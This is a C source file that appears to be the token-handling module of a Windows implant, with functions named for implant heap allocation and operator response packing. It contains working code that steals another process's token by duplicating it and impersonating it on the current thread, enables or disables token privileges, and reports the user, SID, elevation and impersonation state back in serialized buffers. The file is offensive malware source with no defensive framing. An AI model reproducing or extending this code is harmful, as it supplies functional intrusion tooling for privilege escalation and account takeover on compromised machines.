#include "security.h"

#define WCHAR_NULL_TERMINATOR_COUNT 1U
#define DOMAIN_SEPARATOR_AND_TERMINATOR_COUNT 2U
#define TOKEN_FIELD_FALSE 0U
#define TOKEN_FIELD_TRUE 1U

/**
 * @brief Builds a TOKEN_SUMMARY response from an already-open token handle.
 *
 * The response contains a TOKEN_SUMMARY_HEADER followed by two UTF-16LE
 * strings: the account name and the SID string. Both strings include their
 * terminating null characters.
 *
 * @param tokenHandle The token to query.
 * @param impersonated Non-zero if the current security context is impersonated.
 * @param responseData Receives the heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
static DWORD BuildTokenSummaryResponseFromToken(
	HANDLE tokenHandle,
	DWORD impersonated,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = ERROR_QUERY_TOKEN_USER_FAILED;
	DWORD tokenUserLength = 0;
	DWORD elevationLength = 0;
	DWORD nameLength = 0;
	DWORD domainLength = 0;
	DWORD totalLength = 0;
	DWORD nameBytes = 0;
	DWORD sidBytes = 0;
	TOKEN_USER* tokenUser = NULL;
	TOKEN_ELEVATION tokenElevation = { 0 };
	SID_NAME_USE sidNameUse = SidTypeUnknown;
	LPWSTR sidString = NULL;
	PWSTR userName = NULL;
	PWSTR domainName = NULL;
	PWSTR accountName = NULL;
	PWSTR responseBuffer = NULL;
	TOKEN_SUMMARY_HEADER* responseHeader = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	(void)GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &tokenUserLength);
	if (tokenUserLength == 0)
	{
		return ERROR_QUERY_TOKEN_USER_FAILED;
	}

	tokenUser = (TOKEN_USER*)ImplantHeapAlloc(tokenUserLength);
	if (tokenUser == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenUser,
		tokenUser,
		tokenUserLength,
		&tokenUserLength
	))
	{
		status = ERROR_QUERY_TOKEN_USER_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenElevation,
		&tokenElevation,
		sizeof(tokenElevation),
		&elevationLength
	))
	{
		status = ERROR_QUERY_TOKEN_ELEVATION_FAILED;
		goto cleanup;
	}

	(void)LookupAccountSidW(
		NULL,
		tokenUser->User.Sid,
		NULL,
		&nameLength,
		NULL,
		&domainLength,
		&sidNameUse
	);
	if (nameLength == 0)
	{
		status = ERROR_LOOKUP_ACCOUNT_SID_FAILED;
		goto cleanup;
	}

	userName = (PWSTR)ImplantHeapAlloc((SIZE_T)nameLength * sizeof(WCHAR));
	if (userName == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	domainName = (PWSTR)ImplantHeapAlloc((SIZE_T)domainLength * sizeof(WCHAR));
	if (domainName == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	{
		if (!LookupAccountSidW(
			NULL,
			tokenUser->User.Sid,
			userName,
			&nameLength,
			domainName,
			&domainLength,
			&sidNameUse
		))
		{
			status = ERROR_LOOKUP_ACCOUNT_SID_FAILED;
			goto cleanup;
		}

		if (domainLength > 0)
		{
			size_t userNameLength = wcslen(userName);
			size_t domainNameLength = wcslen(domainName);
			size_t combinedCount =
				domainNameLength +
				userNameLength +
				DOMAIN_SEPARATOR_AND_TERMINATOR_COUNT;

			accountName = (PWSTR)ImplantHeapAlloc(combinedCount * sizeof(WCHAR));
			if (accountName == NULL)
			{
				status = ERROR_MEMORY_ALLOCATION_FAILED;
				goto cleanup;
			}

			if (FAILED(StringCchPrintfExW(
				accountName,
				combinedCount,
				NULL,
				NULL,
				0,
				L"%ls\\%ls",
				domainName,
				userName
			)))
			{
				status = ERROR_FORMAT_ACCOUNT_NAME_FAILED;
				goto cleanup;
			}

			nameBytes =
				((DWORD)wcslen(accountName) + WCHAR_NULL_TERMINATOR_COUNT) *
				sizeof(WCHAR);
		}
		else
		{
			size_t accountNameBytes =
				(wcslen(userName) + WCHAR_NULL_TERMINATOR_COUNT) * sizeof(WCHAR);

			accountName = (PWSTR)ImplantHeapAlloc(accountNameBytes);
			if (accountName == NULL)
			{
				status = ERROR_MEMORY_ALLOCATION_FAILED;
				goto cleanup;
			}

			CopyMemory(accountName, userName, accountNameBytes);
			nameBytes =
				((DWORD)wcslen(accountName) + WCHAR_NULL_TERMINATOR_COUNT) *
				sizeof(WCHAR);
		}
	}

	if (!ConvertSidToStringSidW(tokenUser->User.Sid, &sidString))
	{
		status = ERROR_CONVERT_SID_TO_STRING_FAILED;
		goto cleanup;
	}

	sidBytes =
		((DWORD)wcslen(sidString) + WCHAR_NULL_TERMINATOR_COUNT) *
		sizeof(WCHAR);
	totalLength = sizeof(TOKEN_SUMMARY_HEADER) + nameBytes + sidBytes;

	responseBuffer = (PWSTR)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	responseHeader = (TOKEN_SUMMARY_HEADER*)responseBuffer;
	if (tokenElevation.TokenIsElevated)
	{
		responseHeader->elevated = TOKEN_FIELD_TRUE;
	}
	else
	{
		responseHeader->elevated = TOKEN_FIELD_FALSE;
	}

	responseHeader->impersonated = impersonated;
	responseHeader->userNameLength = nameBytes;
	responseHeader->userSidLength = sidBytes;

	CopyMemory(
		(PBYTE)responseBuffer + sizeof(TOKEN_SUMMARY_HEADER),
		accountName,
		nameBytes
	);
	CopyMemory(
		(PBYTE)responseBuffer + sizeof(TOKEN_SUMMARY_HEADER) + nameBytes,
		sidString,
		sidBytes
	);

	*responseData = (PBYTE)responseBuffer;
	*responseLen = totalLength;
	responseBuffer = NULL;
	status = NO_ERROR;

cleanup:
	if (responseBuffer != NULL)
	{
		ImplantHeapFree(responseBuffer);
	}

	if (accountName != NULL)
	{
		ImplantHeapFree(accountName);
	}

	if (domainName != NULL)
	{
		ImplantHeapFree(domainName);
	}

	if (userName != NULL)
	{
		ImplantHeapFree(userName);
	}

	if (sidString != NULL)
	{
		LocalFree(sidString);
	}

	if (tokenUser != NULL)
	{
		ImplantHeapFree(tokenUser);
	}

	return status;
}

DWORD BuildTokenEnablePrivilegeResponseFromToken(
	PCWSTR privilegeName,
	DWORD enableStatus,
	DWORD prevStatus,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PBYTE responseBuffer = NULL;
	DWORD totalLength = 0;

	//size of string with null terminators
	DWORD nameBytes = (DWORD)(wcslen(privilegeName) + 1) * sizeof(WCHAR);

	//total buffer size = 4(status) + 4(prev status) + 4(string length) + string size
	totalLength = sizeof(DWORD) + sizeof(DWORD) + sizeof(DWORD) + nameBytes;

	responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	PBYTE offset = responseBuffer;

	*((DWORD*)offset) = enableStatus;
	offset += sizeof(DWORD);

	//pack the previous status
	*((DWORD*)offset) = prevStatus;
	offset += sizeof(DWORD);

	//pack the string length
	*((DWORD*)offset) = nameBytes;
	offset += sizeof(DWORD);

	//pack privilege
	memcpy(offset, privilegeName, nameBytes);

	*responseData = responseBuffer;
	*responseLen = totalLength;

cleanup:
	if (status != NO_ERROR && responseBuffer != NULL) {
		ImplantHeapFree(responseBuffer);
		if (responseData != NULL) *responseData = NULL;
		if (responseLen != NULL) *responseLen = 0;
	}

	return status;
}

DWORD BuildTokenImpersonationResponseFromToken(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	HANDLE hThreadToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	PBYTE responseBuffer = NULL;
	DWORD dwLength = 0;

	if (responseData != NULL) *responseData = NULL;
	if (responseLen != NULL) *responseLen = 0;

	//open thread token (now impersonating the target)
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
		return GetLastError();
	}

	GetTokenInformation(hThreadToken, TokenUser, NULL, 0, &dwLength);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		status = ERROR_QUERY_TOKEN_USER_FAILED;
		goto cleanup;
	}

	pTokenUser = (PTOKEN_USER)ImplantHeapAlloc(dwLength);
	if (!pTokenUser || !GetTokenInformation(hThreadToken, TokenUser, pTokenUser, dwLength, &dwLength)) {
		status = ERROR_QUERY_TOKEN_USER_FAILED;
		goto cleanup;
	}

	//get username and domain
	WCHAR name[256];
	DWORD cchName = 256;
	WCHAR domainName[256];
	DWORD cchDomainName = 256;
	SID_NAME_USE eUse = SidTypeUnknown;

	if (!LookupAccountSidW(NULL, pTokenUser->User.Sid, name, &cchName, domainName, &cchDomainName, &eUse)) {
		status = GetLastError();
		goto cleanup;
	}

	//get size
	DWORD stringBytes = (cchDomainName + 1 + cchName + 1) * sizeof(WCHAR);

	//buffer: [DWORD pid] [DWORD success] [DWORD username_len] [WCHAR[] username]
	DWORD totalLength = sizeof(DWORD) + sizeof(DWORD) + sizeof(DWORD) + stringBytes;

	//allocate and fill buffer
	responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	PBYTE offset = responseBuffer;

	*((DWORD*)offset) = processId;
	offset += sizeof(DWORD);

	*((DWORD*)offset) = TOKEN_IMPERSONATION_SUCCESS;
	offset += sizeof(DWORD);

	*((DWORD*)offset) = stringBytes;
	offset += sizeof(DWORD);

	wsprintfW((LPWSTR)offset, L"%s\\%s", domainName, name);

	*responseData = responseBuffer;
	*responseLen = totalLength;

cleanup:
	if (hThreadToken != NULL) {
		CloseHandle(hThreadToken);
	}
	if (pTokenUser != NULL) {
		ImplantHeapFree(pTokenUser);
	}

	if (status != NO_ERROR && responseBuffer != NULL) {
		ImplantHeapFree(responseBuffer);
		if (responseData != NULL) *responseData = NULL;
		if (responseLen != NULL) *responseLen = 0;
	}
	return status;
}

DWORD BuildCurrentTokenSummaryResponse(PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
	DWORD impersonated = 0;
	HANDLE processToken = NULL;
	HANDLE threadToken = NULL;

	if (responseData != NULL)
	{
		*responseData = NULL;
	}

	if (responseLen != NULL)
	{
		*responseLen = 0;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &processToken))
	{
		return ERROR_OPEN_PROCESS_TOKEN_FAILED;
	}

	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &threadToken))
	{
		impersonated = TOKEN_FIELD_TRUE;
		CloseHandle(threadToken);
		threadToken = NULL;
	}
	else if (GetLastError() != ERROR_NO_TOKEN)
	{
		CloseHandle(processToken);
		return ERROR_OPEN_THREAD_TOKEN_FAILED;
	}

	status = BuildTokenSummaryResponseFromToken(
		processToken,
		impersonated,
		responseData,
		responseLen
	);

	CloseHandle(processToken);
	return status;
}

DWORD ImpersonateProcessToken(DWORD processId)
{
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	HANDLE hDuplicateToken = NULL;
	DWORD status = NO_ERROR;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
	if (hProcess == NULL) {
		DWORD dwError = GetLastError();

		if (dwError == ERROR_ACCESS_DENIED)
		{
			//no permission
			return ERROR_PID_PERMISSION;
		}

		//bad pid
		return ERROR_INVALID_PID;
	}

	//open process token with duplicate rights
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	//duplicate the token
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicateToken)) {
		status = GetLastError();
		goto cleanup;
	}

	//apply it to the current thread
	if (!ImpersonateLoggedOnUser(hDuplicateToken)) {
		status = GetLastError();
		goto cleanup;
	}

cleanup:
	if (hDuplicateToken != NULL) {
		CloseHandle(hDuplicateToken);
	}
	if (hToken != NULL) {
		CloseHandle(hToken);
	}
	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}
	return status;
}

DWORD EnableCurrentTokenPrivilege(PCWSTR privilegeName)
{
	LUID luid;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	DWORD status = NO_ERROR;

	//check if privilegeName is valid
	if (!LookupPrivilegeValueW(
		NULL,
		privilegeName,
		&luid
	))
	{
		return ERROR_INVALID_PRIVILEGE;
	}

	//open process token with TOKEN_ADJUST_PRIVILEGES
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		status = GetLastError();
		goto cleanup;
	}

	//set up tp structure
	//adjust 1 privilege
	tp.PrivilegeCount = 1;
	//set luid
	tp.Privileges[0].Luid = luid;
	//enable the privilege
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//adjust the token privileges
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,                  // Do not disable all privileges
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL
	))
	{
		status = GetLastError();
	}
	else
	{
		//check GetLastError() to see if it returned ERROR_NOT_ALL_ASSIGNED
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		{
			status = ERROR_NOT_ALL_ASSIGNED;
		}
	}

cleanup:
	if (hToken != NULL)
	{
		CloseHandle(hToken);
	}

	return status;
}

DWORD DisableCurrentTokenPrivilege(PCWSTR privilegeName)
{
	LUID luid;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	DWORD status = NO_ERROR;

	//check if privilegeName is valid
	if (!LookupPrivilegeValueW(
		NULL,
		privilegeName,
		&luid
	))
	{
		return ERROR_INVALID_PRIVILEGE;
	}

	//open process token with TOKEN_ADJUST_PRIVILEGES
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		status = GetLastError();
		goto cleanup;
	}

	//set up tp structure
	//adjust 1 privilege
	tp.PrivilegeCount = 1;
	//set luid
	tp.Privileges[0].Luid = luid;
	//disable the privilege
	tp.Privileges[0].Attributes = 0;

	//adjust the token privileges
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,                  // Do not disable all privileges
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL
	))
	{
		status = GetLastError();
	}
	else
	{
		//check GetLastError() to see if it returned ERROR_NOT_ALL_ASSIGNED
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		{
			status = ERROR_NOT_ALL_ASSIGNED;
		}
	}

cleanup:
	if (hToken != NULL)
	{
		CloseHandle(hToken);
	}

	return status;
}

BOOL IsPrivilegeEnabled(PCWSTR privilegeName)
{
	LUID luid;
	HANDLE hToken = NULL;
	BOOL bEnabled = FALSE;
	PRIVILEGE_SET ps;

	//get the LUID
	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
	{
		bEnabled = FALSE;
		goto cleanup;
	}

	//open process token with TOKEN_QUERY
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		bEnabled = FALSE;
		goto cleanup;
	}

	//set up PRIVILEGE_SET structure
	ps.PrivilegeCount = 1;
	ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
	ps.Privilege[0].Luid = luid;
	ps.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	//check if this specific privilege is enabled
	PrivilegeCheck(hToken, &ps, &bEnabled);

cleanup:
	if (hToken != NULL)
		CloseHandle(hToken);

	return bEnabled;
}